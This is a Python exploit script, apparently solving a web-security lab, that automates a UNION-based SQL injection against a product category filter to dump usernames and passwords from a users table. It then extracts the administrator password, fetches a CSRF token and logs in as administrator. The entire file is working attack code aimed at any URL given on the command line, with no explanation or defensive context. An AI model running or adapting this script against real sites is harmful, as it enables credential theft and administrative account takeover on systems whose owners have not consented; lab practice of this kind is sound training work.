#!/usr/bin/env python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

PATH = "/filter?category=Accessories"


def is_admin_row(t):
    return t and "administrator:" in t

# extract admin password
def extract_data(url):
    payload = "' UNION SELECT null,username || ':' || password FROM users--"
    r = requests.get(url + PATH + payload, verify=False)

    if "administrator" in r.text:
        print("[+] Admin password discovered")
        soup = BeautifulSoup(r.text, "html.parser")
        row = soup.find(string=is_admin_row)
        admin_password = row.split(":")[1]
        print("[+] The administrator password is: '%s'" % admin_password)
        return admin_password
    return None    

# grab csrf token
def get_csrf_token(s, url):
    r = s.get(url + "/login",verify = False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"]
    return csrf

# login as admin
def admin_login(url, admin_password):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": "administrator", "password": admin_password}
    r = s.post(url + "/login", data = data, verify = False)
    res = r.text
    if "Log out" in res:
        return True
    return False        


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        sys.exit()

    admin_password = extract_data(url)

    if not admin_password:
        print("[-] No administrator password found")
        sys.exit()

    print("[+] Success")

    s = requests.Session()

    if admin_login(url, admin_password):
        print("[+] Successfully logged in!")
    else:
        print("[-] Login failed")